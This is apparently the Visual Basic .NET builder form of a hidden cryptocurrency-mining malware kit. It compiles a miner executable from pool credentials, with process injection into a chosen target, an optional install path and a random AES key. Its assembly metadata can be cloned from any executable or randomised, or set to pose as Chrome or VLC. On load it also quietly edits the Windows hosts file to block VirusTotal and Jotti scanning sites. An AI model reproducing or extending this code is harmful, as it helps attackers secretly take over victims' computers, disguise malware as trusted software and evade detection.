Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Public Class Form7

    Public Shared rand As New Random()

    Private Sub Form7_Load(sender As Object, e As EventArgs) Handles Me.Load
        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me

        BackgroundWorker1.RunWorkerAsync()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
        Catch ex As Exception
        End Try

        Try
            txtInstallPathMain.SelectedIndex = 0
            txtInjection.SelectedIndex = 0
        Catch ex As Exception
        End Try

        Try
            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\System32\drivers\etc\hosts"
            If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then

                Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
                   Environment.NewLine + "127.0.0.1    https://virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    www.virusscan.jotti.org"

                IO.File.AppendAllText(path, appendText)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public OutputPayload
    Public Resources_dll = Randomi(rand.Next(5, 10))
    Public Resources_cpu = Randomi(rand.Next(5, 10))
    Public Resources_nvidia = Randomi(rand.Next(5, 10))
    Public Resources_amd = Randomi(rand.Next(5, 10))
    Public Resources_Parent = Randomi(rand.Next(5, 10))
    Public AESKEY As String = Randomi(rand.Next(5, 10))

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
                Dim s As New SaveFileDialog
                s.Filter = "Executable |*.exe"
                s.InitialDirectory = Application.StartupPath
                If s.ShowDialog = DialogResult.OK Then
                    OutputPayload = s.FileName
                    BackgroundWorker2.RunWorkerAsync()
                    btnBuild.Enabled = False
                    btnBuild.Text = "Please wait..."
                End If
            Else
                MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
                MinerPanel.SelectedIndex = 0
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim InjectionTarget = txtInjection.Text.Split(" ")
            Dim Source = My.Resources.Program
            txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
            Source = Replace(Source, "#dll", Resources_dll)
            Source = Replace(Source, "#cpu", Resources_cpu)
            Source = Replace(Source, "#nvidia", Resources_nvidia)
            Source = Replace(Source, "#amd", Resources_amd)
            Source = Replace(Source, "#ParentRes", Resources_Parent)
            Source = Replace(Source, "#USER", txtPoolUsername.Text)
            Source = Replace(Source, "#URL", txtPoolURL.Text)
            Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
            Source = Replace(Source, "#KEY", AESKEY)
            Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
            Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
            Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))


            txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)

            If chkInstall.Checked = True Then
                Source = Replace(Source, "#Const INS = False", "#Const INS = True")
                Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
            End If


            If chkAssembly.Checked = True Then
                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
                Source = Replace(Source, "#Const Assembly = False", "#Const Assembly = True")

                Source = Replace(Source, "%Title%", txtTitle.Text)
                Source = Replace(Source, "%Description%", txtDescription.Text)
                Source = Replace(Source, "%Company%", txtCompany.Text)
                Source = Replace(Source, "%Product%", txtProduct.Text)
                Source = Replace(Source, "%Copyright%", txtCopyright.Text)
                Source = Replace(Source, "%Trademark%", txtTrademark.Text)
                Source = Replace(Source, "%v1%", num_Assembly1.Text)
                Source = Replace(Source, "%v2%", num_Assembly2.Text)
                Source = Replace(Source, "%v3%", num_Assembly3.Text)
                Source = Replace(Source, "%v4%", num_Assembly4.Text)
                Source = Replace(Source, "%Guid%", Guid.NewGuid.ToString)

            End If

            If chkIcon.Checked And txtIconPath.Text IsNot "" Then
                CodeDom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
            Else
                CodeDom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
            End If

            If CodeDom.OK = True Then
                ProgressBar10.Value = 0
                ProgressBar10.Value = 100
                txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True

                Try
                    IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                Catch ex As Exception
                End Try

            Else
                txtLog.Text = txtLog.Text.Insert(0, "Error!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(4)
                Case 0
                    txtTitle.Text = "chrome.exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "70"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3538"
                    num_Assembly4.Text = "110"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs)
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub MephTabControl2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles MinerPanel.SelectedIndexChanged
        On Error Resume Next
        If Me.MinerPanel.SelectedIndex = 0 Then
        End If
    End Sub

    Private Sub chkInstall_Click(sender As Object, e As EventArgs) Handles chkInstall.Click
        If chkInstall.Checked = True Then
            chkInstall.Text = "Installl Enabled"
            txtInstallPathMain.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Installl Disabled"
            txtInstallPathMain.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_Click(sender As Object, e As EventArgs) Handles chkAssembly.Click
        If chkAssembly.Checked = True Then
            chkAssembly.Text = "Enabled"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "Disabled"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub chkIcon_Click(sender As Object, e As EventArgs) Handles chkIcon.Click
        If chkIcon.Checked = True Then
            chkIcon.Text = "Enabled"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "Disabled"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Me.Close()
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
    End Sub

    Private Sub TabPage3_Click(sender As Object, e As EventArgs) Handles TabPage3.Click

    End Sub

    Private Sub AzenisForm1_Click(sender As Object, e As EventArgs) Handles AzenisForm1.Click

    End Sub

    Private Sub TabPage1_Click(sender As Object, e As EventArgs) Handles TabPage1.Click

    End Sub

    Private Sub txtInjection_SelectedIndexChanged(sender As Object, e As EventArgs) Handles txtInjection.SelectedIndexChanged

    End Sub

    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click

    End Sub

    Private Sub txtPoolURL_TextChanged(sender As Object, e As EventArgs) Handles txtPoolURL.TextChanged

    End Sub

    Private Sub txtPoolPassowrd_TextChanged(sender As Object, e As EventArgs) Handles txtPoolPassowrd.TextChanged

    End Sub

    Private Sub txtPoolUsername_TextChanged(sender As Object, e As EventArgs) Handles txtPoolUsername.TextChanged

    End Sub

    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click

    End Sub

    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click

    End Sub

    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click

    End Sub

    Private Sub TabPage2_Click(sender As Object, e As EventArgs) Handles TabPage2.Click

    End Sub

    Private Sub txtInstallFileName_TextChanged(sender As Object, e As EventArgs) Handles txtInstallFileName.TextChanged

    End Sub

    Private Sub txtInstallPathMain_SelectedIndexChanged(sender As Object, e As EventArgs) Handles txtInstallPathMain.SelectedIndexChanged

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub num_Assembly4_TextChanged(sender As Object, e As EventArgs) Handles num_Assembly4.TextChanged

    End Sub

    Private Sub num_Assembly3_TextChanged(sender As Object, e As EventArgs) Handles num_Assembly3.TextChanged

    End Sub

    Private Sub num_Assembly2_TextChanged(sender As Object, e As EventArgs) Handles num_Assembly2.TextChanged

    End Sub

    Private Sub num_Assembly1_TextChanged(sender As Object, e As EventArgs) Handles num_Assembly1.TextChanged

    End Sub

    Private Sub txtTrademark_TextChanged(sender As Object, e As EventArgs) Handles txtTrademark.TextChanged

    End Sub

    Private Sub txtCopyright_TextChanged(sender As Object, e As EventArgs) Handles txtCopyright.TextChanged

    End Sub

    Private Sub txtProduct_TextChanged(sender As Object, e As EventArgs) Handles txtProduct.TextChanged

    End Sub

    Private Sub txtCompany_TextChanged(sender As Object, e As EventArgs) Handles txtCompany.TextChanged

    End Sub

    Private Sub txtDescription_TextChanged(sender As Object, e As EventArgs) Handles txtDescription.TextChanged

    End Sub

    Private Sub txtTitle_TextChanged(sender As Object, e As EventArgs) Handles txtTitle.TextChanged

    End Sub

    Private Sub btnBrowseIcon_Click_1(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click

    End Sub

    Private Sub picIcon_Click(sender As Object, e As EventArgs) Handles picIcon.Click

    End Sub

    Private Sub txtIconPath_TextChanged(sender As Object, e As EventArgs) Handles txtIconPath.TextChanged

    End Sub

    Private Sub TabPage5_Click(sender As Object, e As EventArgs) Handles TabPage5.Click

    End Sub

    Private Sub ProgressBar10_Click(sender As Object, e As EventArgs) Handles ProgressBar10.Click

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub txtMaxCPU_SelectedIndexChanged(sender As Object, e As EventArgs) Handles txtMaxCPU.SelectedIndexChanged

    End Sub

    Private Sub txtLog_TextChanged(sender As Object, e As EventArgs) Handles txtLog.TextChanged

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub
End Class